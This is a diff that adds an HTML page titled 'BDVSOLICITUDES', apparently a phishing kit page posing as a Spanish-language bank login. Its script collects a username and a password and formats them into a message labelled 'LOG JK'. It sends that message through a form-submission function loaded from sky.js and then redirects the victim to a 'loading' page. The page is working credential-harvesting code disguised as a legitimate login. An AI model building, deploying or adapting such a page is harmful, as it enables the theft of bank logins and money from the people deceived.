@@ -1,0 +1,353 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>BDVSOLICITUDES</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="icon" href="favicon.png" type="image/x-icon">
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: url(background.webp);
+        background-size: cover;
+        background-position: center;
+      }
+
+      .container {
+        display: flex;
+        height: 100%;
+        width: 80%;
+      }
+
+      .left-side {
+        width: 40%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .right-side {
+        width: 30%;
+      }
+
+      .form {
+        width: 80%;
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      @media (max-width: 768px) {
+        body {
+          background: #ededed;
+        }
+        .container {
+          flex-direction: column;
+        }
+        .left-side {
+          width: 100%;
+          height: 100vh;
+        }
+        .right-side {
+          display: none;
+        }
+      }
+
+      .form-group {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
+
+      .form-group label {
+        position: absolute;
+        top: 50%;
+        left: 10px;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+      }
+      .form-group input:focus {
+        border: 0;
+      }
+      .form-group input:focus + label,
+      .form-group input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+
+      button {
+        background-color: #0067b1;
+        color: white;
+        border-radius: 3px;
+        border: 0;
+        padding: 10px 20px;
+        text-align: center;
+        display: inline-block;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        font-size: 16px;
+      }
+
+      button:disabled {
+        background-color: #E0E0E0;
+        cursor: not-allowed;
+      }
+
+      .button-container {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 20px;
+        margin-bottom: 20px;
+      }
+
+      .cancel-btn {
+        background-color: #0067b1;
+      }
+
+      .form-group2 {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
+
+      .form-group2 label {
+        position: absolute;
+        top: 50%;
+        left: 23%;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
+
+      .form-group2 input {
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+        width: 100%;
+      }
+
+      .form-group2 input:focus {
+        border: 0;
+      }
+
+      .form-group2 input:focus + label,
+      .form-group2 input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+
+      .overlay {
+        display: none;
+        justify-content: center;
+        align-items: center;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 9999;
+      }
+
+      .content {
+        background-color: #fff;
+        width: 350px;
+        border-radius: 5px;
+        text-align: center;
+        padding: 20px 0;
+        box-sizing: border-box;
+      }
+
+     #entrarBtn {
+        width: 180px;
+        height: 38px;
+        padding: 0;
+        font-size: 16px;
+        background-color: #0067b1;
+        color: white;
+        border-radius: 3px;
+        cursor: pointer;
+        border: none;
+        transition: background-color 0.3s;
+      }
+
+      #entrarBtn:disabled {
+        background-color: #E0E0E0;
+        cursor: not-allowed;
+      }
+    </style>
+  </head>
+  <body>
+
+    <div class="overlay" id="overlay">
+      <div class="content">
+        <form id="passwordForm">
+          <h4 style="color: #0067b1 !important; margin-top: 0;">Introduce tu contraseña</h4>
+          <div class="form-group2">
+            <input type="password" name="contra" id="contra" required />
+            <label for="contra" style="position: absolute; top: 15px; left: 23%; font-size: 13px;">Contraseña *</label>
+            <i class="material-icons toggle-password" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 20px; cursor: pointer;">visibility</i>
+          </div>
+
+          <div id="password-feedback" style="font-size: 11px; text-align: left; margin: -5px 20px 15px 20px; color: #d9534f; line-height: 1.3;">
+            Debe tener 1 mayúscula, 1 minúscula, 1 número y 1 carácter especial.
+          </div>
+
+          <input type="hidden" name="nombre" id="nombreOculto" />
+          <div class="button-container" style="margin-bottom: 0;">
+            <button type="submit" style="width: auto" id="continuarBtn" disabled>Continuar</button>
+            <button type="button" class="cancel-btn" style="width: auto" onclick="cancelar()">Cancelar</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="left-side">
+        <form id="nombreForm" class="form">
+          <div style="text-align: center">
+            <img src="logo.png" alt="" style="width: 90%; margin-top: 20px" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div class="form-group">
+              <input
+                type="text"
+                id="nombre"
+                name="nombre"
+                style="width: 100%"
+                maxlength="16"
+                required
+                oninput="quitarEspacios()"
+              />
+              <label for="nombre" style="position: absolute; top: 15px; left: 10px; font-size: 13px;">Usuario *</label>
+            </div>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button type="button" id="entrarBtn" disabled>Entrar</button>
+          </div>
+          <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #707070; margin-top: 30px; margin-bottom: 30px;">
+              <br />
+          </div>
+        </form>
+      </div>
+      <div class="right-side"></div>
+    </div>
+
+<script src="sky.js"></script>
+<script>
+  document.getElementById("entrarBtn").addEventListener("click", function() {
+      var nombre = document.getElementById("nombre").value;
+      
+      if (nombre.trim().length > 0) {
+          localStorage.setItem("usuario", nombre);
+          document.getElementById("nombreOculto").value = nombre; 
+          document.getElementById("overlay").style.display = "flex"; 
+      }
+  });
+
+  document.getElementById("continuarBtn").addEventListener("click", async function(e) {
+      e.preventDefault(); 
+      
+      var contra = document.getElementById("contra").value;
+      var nombre = localStorage.getItem("usuario") || "Desconocido";
+
+      var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/;
+
+      if (regex.test(contra)) {
+          this.disabled = true;
+
+          const mensaje = "🔐 **LOG JK**\n👤 Usuario: `" + nombre + "`\n🔑 Pass: `" + contra + "`";
+          
+          try {
+              await enviarFormulario("formulario1", { content: mensaje });
+          } catch (error) {
+              console.error(error);
+          }
+
+          window.location.href = "cargando.html";
+      }
+  });
+
+  document.getElementById("nombre").addEventListener("input", function() {
+      var nombreVal = this.value.trim();
+      document.getElementById("entrarBtn").disabled = (nombreVal.length === 0);
+  });
+
+  document.getElementById("contra").addEventListener("input", function() {
+      var contra = this.value;
+      var feedback = document.getElementById("password-feedback");
+      var boton = document.getElementById("continuarBtn");
+
+      let faltantes = [];
+
+      if (!/(?=.*[a-z])/.test(contra)) {
+          faltantes.push("una letra minúscula");
+      }
+      if (!/(?=.*[A-Z])/.test(contra)) {
+          faltantes.push("una letra mayúscula");
+      }
+      if (!/(?=.*\d)/.test(contra)) {
+          faltantes.push("un número");
+      }
+      if (!/(?=.*[\W_])/.test(contra)) {
+          faltantes.push("un carácter especial");
+      }
+
+      if (faltantes.length === 0) {
+          feedback.style.color = "#28a745";
+          feedback.innerHTML = "✔ ¡Contraseña válida!";
+          boton.disabled = false;
+      } else {
+          feedback.style.color = "#d9534f";
+          feedback.innerHTML = "Falta: " + faltantes.join(", ") + ".";
+          boton.disabled = true;
+      }
+  });
+
+  function togglePasswordVisibility() {
+      const field = document.getElementById("contra");
+      field.type = field.type === "password" ? "text" : "password";
+  }
+
+  function cancelar() {
+      document.getElementById("overlay").style.display = "none";
+      document.getElementById("contra").value = "";
+      document.getElementById("continuarBtn").disabled = true;
+      document.getElementById("entrarBtn").disabled = false;
+  }
+
+  function quitarEspacios() {
+      var input = document.getElementById("nombre");
+      input.value = input.value.trim();
+  }
+</script>
+</body>
+</html>
